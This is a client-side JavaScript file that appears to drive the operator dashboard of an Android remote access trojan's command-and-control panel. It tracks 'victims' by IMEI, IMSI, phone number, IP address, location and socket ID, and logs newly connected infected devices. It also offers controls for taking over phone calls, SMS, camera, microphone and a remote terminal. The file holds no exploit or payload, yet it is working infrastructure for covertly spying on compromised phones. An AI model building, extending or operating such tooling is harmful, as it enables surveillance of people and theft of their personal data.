$(document).ready(function (){
      var socket = io.connect("http://localhost:5001");

      socket.on('after connect', function(msg) {
          $.ajax({
            url: '/log',
            type: 'post',
            data: {
              'data' : msg['data'],
              'highlight' : 'light'
            },
            success: function(data){
              $('.log-class').append(data.htmlresponse)
            }
          });
      });

      socket.on('victims', function(msg) {
        if(msg['data'] != "None"){
          $.ajax({
            url: '/log',
            type: 'post',
            data: {
              'data' : 'Fetching clients from database ...',
              'highlight' : 'light'
            },
            success: function(data){
              $('.log-class').append(data.htmlresponse);
              console.log(msg['data'].length)
              for (var i = 0; i <= (msg['data'].length - 1); i++) {
                var items = []
                for (var j = 0; j <= (msg['data'][i].length - 1); j++){
                  console.log(msg['data'][i][j])
                  items.push(msg['data'][i][j])
                }
                $.ajax({
                  url: '/clients',
                  type: 'post',
                  data: {
                    'model' : items[1],
                    'device-id' : items[2],
                    'ip-address' : items[3],
                    'api' : items[4],
                    'imei' : items[5],
                    'socketid' : items[6],
                    'phone' : items[7],
                    'imsi' : 'imsi',
                    'location' : 'location'
                  },
                  success: function(data){
                    $('.victims-body').append(data.htmlresponse);
                  }
                });
              }
              $.ajax({
                url: '/log',
                type: 'post',
                data: {
                  'data' : 'Finished fetching clients from database',
                  'highlight' : 'success'
                },
                success: function(data){
                  $('.log-class').append(data.htmlresponse);
                }
              });
            }
          });
          
         
        }else{
          $.ajax({
            url: '/log',
            type: 'post',
            data: {
              'data' : 'No active clients',
              'highlight' : 'danger'
            },
            success: function(data){
              $('.log-class').append(data.htmlresponse);
            }
          });
        }
      });
      
      socket.on('pingback', function(msg){
        $.ajax({
            url: '/log',
            type: 'post',
            data: {
              'data' : `${msg['deviceid']} pinged server, connection is active`,
              'highlight' : 'success'
            },
            success: function(data){
                $('.log-class').append(data.htmlresponse);
            }
        });
      })

      socket.on('update victim ip', function(msg) {
        var ip = document.getElementsByClassName(`ip-address-${msg['data'][0]}`)
        // set ip text msg['ipaddress']
        $.ajax({
            url: '/log',
            type: 'post',
            data: {
              'data' : `${msg['data'][0]} IP address changed to ${msg['data'][1]}`,
              'highlight' : 'light'
            },
            success: function(data){
                $('.log-class').append(data.htmlresponse);
            }
        });
      });

      socket.on('update victim socketid', function(msg) {
        var socketid = document.getElementsByClassName(`socket-id-${msg['data'][0]}`)
        // set socketid text to msg['socketid']
        $.ajax({
            url: '/log',
            type: 'post',
            data: {
              'data' : `${msg['data'][0]} socket id changed to ${msg['data'][1]}`,
              'highlight' : 'light'
            },
            success: function(data){
                $('.log-class').append(data.htmlresponse);
            }
        });
      });

      socket.on('new device', function(msg) {
        var deviceid = msg['data'][1]
        console.log("new device event")
        $.ajax({
          url: '/clients',
          type: 'post',
          data: {
            'model' : msg['data'][0],
            'device-id' : deviceid,
            'ip-address' : msg['data'][2],
            'imei' : msg['data'][3],
            'api' : msg['data'][4],
            'socketid' : msg['data'][5],
            'phone' : msg['data'][6],
            'imsi' : msg['data'][7],
            'location' : msg['data'][8]
          },
          success: function(data){
            $('.victims-body').append(data.htmlresponse);
            $.ajax({
              url: '/log',
              type: 'post',
              data: {
                'data' : `New device connected: ${deviceid}`,
                'highlight' : 'light'
              },
              success: function(data){
                  $('.log-class').append(data.htmlresponse);
                  $('.log-class').scrollTop
              }
            });
          }
        });
      });

      socket.on('update value', function(msg) {
        console.log('Slider value updated');
      });
      

      $("#btn-connection-status").click(function(){
        $.ajax({
            url: '/log',
            type: 'post',
            data: {
              'data' : 'Testing connection with client id',
              'highlight' : 'light'
            },
            success: function(data){
                $('.log-class').append(data.htmlresponse);
            }
        });
        // implement scroll to bottom and write to logs file
      });


      $("#btn-phone").click(function(){
          $("#phoneModal").modal({
              backdrop: 'static',
              keyboard: false
          });
          $("#phoneModal").modal('show');
      });


      $("#phone-modal-dismiss").click(function(){
          $("#phoneModal").modal('hide');
      });


      $("#btn-sms").click(function(){
          $("#smsModal").modal({
              backdrop: 'static',
              keyboard: false
          });
          $("#smsModal").modal('show');
      });


      $("#sms-modal-dismiss").click(function(){
          $("#smsModal").modal('hide');
      });


      $("#btn-camera").click(function(){
          $("#cameraModal").modal({
              backdrop: 'static',
              keyboard: false
          });
          $("#cameraModal").modal('show');
      });


      $("#camera-modal-dismiss").click(function(){
          $("#cameraModal").modal('hide');
      });

      $("#btn-mic").click(function(){
          $("#micModal").modal({
              backdrop: 'static',
              keyboard: false
          });
          $("#micModal").modal('show');
      });


      $("#mic-modal-dismiss").click(function(){
          $("#micModal").modal('hide');
      });


      $("#btn-terminal").click(function(){
          $("#terminalModal").modal({
              backdrop: 'static',
              keyboard: false
          });
          $("#terminalModal").modal('show');
      });


      $("#terminal-modal-dismiss").click(function(){
          $("#terminalModal").modal('hide');
      });
    });